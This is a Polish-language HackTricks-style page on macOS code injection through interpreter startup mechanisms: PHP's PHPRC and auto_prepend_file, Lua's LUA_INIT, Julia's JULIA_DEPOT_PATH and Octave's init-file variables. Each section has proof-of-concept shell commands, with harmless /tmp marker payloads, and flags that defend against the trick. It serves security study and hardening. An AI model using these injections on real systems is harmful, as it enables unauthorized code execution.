# Wstrzykiwanie do plików startowych interpreterów w macOS

{{#include ../../../banners/hacktricks-training.md}}

Te techniki specyficzne dla środowiska uruchomieniowego wykorzystują odziedziczone zmienne środowiskowe do wyboru konfiguracji startowej lub kodu wykonywanego przed wskazanym skryptem. Lua obsługuje również wariant z kodem wbudowanym.

## Konfiguracja startowa PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` i `auto_prepend_file`

PHP CLI i CGI odczytują konfigurację przy każdym uruchomieniu. `PHPRC` może wskazywać plik `php.ini`, do którego atakujący ma dostęp do odczytu, a `PHP_INI_SCAN_DIR` może przekierować katalog skanowany w poszukiwaniu dodatkowych plików `.ini`. Dyrektywa `auto_prepend_file` powoduje, że PHP parsuje plik przed wskazanym skryptem, więc takie połączenie umożliwia wykonanie kodu podczas uruchamiania.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Alternatywą jest katalog zawierający plik `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Opcja `-n` ignoruje `php.ini`; jawnie podana zaufana ścieżka `-c` ma pierwszeństwo przed `PHPRC`. Pamiętaj, że długotrwały serwerowy SAPI zwykle odczytuje konfigurację podczas uruchamiania serwera WWW, natomiast CLI i CGI robią to przy każdym wywołaniu.<sup>[[1]](#references)</sup>

## Kod startowy Lua

### `LUA_INIT`

Przed przetworzeniem opcji wiersza poleceń lub skryptu docelowego samodzielny interpreter Lua wykonuje `LUA_INIT_<major>_<minor>` albo, jeśli zmienna z numerem wersji nie jest ustawiona, `LUA_INIT`. Wartość zaczynająca się od `@` wskazuje plik; każda inna wartość jest bezpośrednio wykonywana jako kod Lua. Umożliwia to wykonanie kodu startowego zarówno z pliku, jak i bez pliku.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Dokładna nazwa zależy od wersji interpretera, np. `LUA_INIT_5_4`. `lua -E` ignoruje wszystkie zmienne środowiskowe, w tym kod startowy i ścieżki modułów Lua.

## Depot startowy Julii

### `JULIA_DEPOT_PATH` i `startup.jl`

Julia zwykle podczas uruchamiania wykonuje plik `config/startup.jl` z pierwszego depot. `JULIA_DEPOT_PATH` określa listę depotów, więc wskazanie drzewa dostępnego do odczytu przez atakującego przekierowuje do automatycznie ładowanego pliku startowego.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Końcowy separator jest przydatny, gdy ofiara nadal potrzebuje swoich zwykłych pakietów. `julia --startup-file=no` wyłącza ten plik startowy. Wyczyść zmienną przed uruchomieniem, ponieważ kontroluje ona również rejestry pakietów, środowiska, pamięci podręczne i lokalizacje ładowania kodu.

## Pliki startowe GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave podczas uruchamiania wykonuje kilka plików zawierających prawidłowe polecenia Octave. `OCTAVE_SITE_INITFILE` zastępuje ogólnosystemowy plik startowy, a `OCTAVE_VERSION_INITFILE` zastępuje plik właściwy dla danej wersji, co pozwala każdej z tych zmiennych przekierować automatyczne wykonywanie do pliku, który może odczytać atakujący.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` pomija tylko pliki użytkownika, takie jak `~/.octaverc`; **nie** zatrzymuje opisanego wyżej nadpisania pliku site. Użyj `--no-site-file` dla plików site albo `--norc` / `-f`, aby wyłączyć wszystkie pliki startowe.<sup>[[7]](#references)</sup>

## References

- [1] [Plik konfiguracyjny PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Samodzielny interpreter Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Interfejs wiersza poleceń Julii: plik startowy](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Zmienne środowiskowe Julii: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Pliki startowe GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Opcje wiersza poleceń GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
